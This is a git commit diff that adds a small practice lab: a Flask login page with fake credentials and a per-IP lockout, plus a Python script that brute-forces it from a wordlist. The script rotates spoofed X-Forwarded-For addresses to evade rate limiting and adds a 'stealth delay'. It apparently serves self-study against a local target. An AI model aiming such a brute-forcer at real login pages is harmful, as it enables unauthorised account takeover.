dce501eb38786220f8f95ff7276cbc949f837019
ulvakirtan <ulvakirtan@gmail.com>
2026-03-27 00:00:26 +0530

    brute force logins

--- brutelogin.py
+++ brutelogin.py
@@ -1,20 +1,33 @@
 import requests
+import time
 
-url = "http://example.com/login"  # replace with test target
+url = "http://127.0.0.1:5000"
 username = "admin"
 
-passwords = ["1234", "admin", "password", "admin123"]
+attempts = 0
 
-for password in passwords:
-    data = {
-        "username": username,
-        "password": password
-    }
+with open("wordlist.txt", "r") as file:
+    for line in file:
+        password = line.strip()
+        attempts += 1
 
-    response = requests.post(url, data=data)
+        data = {
+            "username": username,
+            "password": password
+        }
+        headers = {
+            "X-Forwarded-For": f"192.168.1.{attempts}"
+            }
+        response = requests.post(url, data=data, headers=headers)
 
-    if "Login failed" not in response.text:
-        print(f"[SUCCESS] Password found: {password}")
-        break
-    else:
-        print(f"[FAILED] {password}")
+        if "Login successful" in response.text:
+            print(f"[SUCCESS] Password found: {password}")
+            print(f"Attempts: {attempts}")
+            break
+        elif "Too many attempts" in response.text:
+            print("[BLOCKED] Too many attempts detected!")
+            break
+        else:
+            print(f"[FAILED] {password}")
+
+        time.sleep(2)  # stealth delay
---
+++ website.py
@@ -0,0 +1,46 @@
+from flask import Flask, request, render_template_string
+
+app = Flask(__name__)
+
+# Fake credentials
+USERNAME = "admin"
+PASSWORD = "secret123"
+
+login_page = """
+<h2>Login Page</h2>
+<form method="POST">
+    Username: <input name="username"><br>
+    Password: <input name="password" type="password"><br>
+    <input type="submit" value="Login">
+</form>
+<p>{{ message }}</p>
+"""
+attempts = {}
+
+@app.route("/", methods=["GET", "POST"])
+def login():
+    global attempts
+    message = ""
+    ip = request.remote_addr
+    ipheader = request.headers.get("X-Forwarded-For", request.remote_addr)
+    if ip not in attempts:
+        attempts[ip] = 0
+
+    if attempts[ip] >= 5:
+        return "Too many attempts. Try later."
+
+
+    if request.method == "POST":
+        username = request.form.get("username")
+        password = request.form.get("password")
+
+        if username == USERNAME and password == PASSWORD:
+            message = "Login successful"
+        else:
+            attempts[ip] += 1
+            message = "Invalid credentials"
+
+    return render_template_string(login_page, message=message)
+
+if __name__ == "__main__":
+    app.run(debug=False)
